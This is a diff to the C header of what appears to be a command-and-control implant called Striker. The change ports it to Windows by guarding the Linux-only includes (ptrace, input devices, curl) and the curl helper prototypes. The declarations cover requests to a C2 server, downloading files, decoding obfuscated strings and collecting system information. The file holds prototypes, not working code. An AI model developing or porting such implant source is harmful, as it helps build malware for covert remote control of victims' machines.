@@ -9,6 +9,13 @@
 #ifndef STRIKER_H
 #define STRIKER_H
 
+#ifdef __WIN32__
+  #include <windows.h>
+  #define IS_WINDOWS
+#else
+  #define IS_LINUX
+#endif
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -16,15 +23,20 @@
 #include <time.h>
 #include <fcntl.h>
 #include <dirent.h>
-#include <linux/input.h>
-#include <sys/select.h>
-#include <pthread.h>
-#include <sys/ptrace.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-#include <curl/curl.h>
 #include "cJSON.h"
 #include "striker_utils.h"
+
+#ifdef IS_LINUX
+  #include <sys/user.h>
+  #include <sys/wait.h>
+  #include <sys/ptrace.h>
+  #include <pthread.h>
+  #include <curl/curl.h>
+  #include <sys/select.h>
+  #include <linux/input.h>
+#else
+  #define PATH_MAX 256
+#endif
 
 // A struct for tracking session info.
 typedef struct{
@@ -54,22 +66,25 @@ typedef struct{
 // For decoding obfuscated strings.
 char *obfs_decode(char *str);
 
-/**
- * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
- * If `absolute` is non-zero, `path` will be treated as absolute URL.
- * It does not define any headers.
- * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
- */
-CURL *init_curl(const char *path, buffer *buff, unsigned char absolute);
+#ifdef IS_LINUX
+  /**
+   * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
+   * If `absolute` is non-zero, `path` will be treated as absolute URL.
+   * It does not define any headers.
+   * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
+   */
+  CURL *init_curl(const char *path, buffer *buff, unsigned char absolute);
 
-/**
- * Callback function for curl to receive response body inside a buffer.
- * This may be called multiple times with chunks of data, depending on the size of the body.
- */
-size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);
+  /**
+   * Callback function for curl to receive response body inside a buffer.
+   * This may be called multiple times with chunks of data, depending on the size of the body.
+   */
+  size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);
 
-// Callback function for curl to write response body to a file.
-size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
+  // Callback function for curl to write response body to a file.
+  size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
+#endif
+
 
 // Return a json object containing system information.
 cJSON *sysinfo();
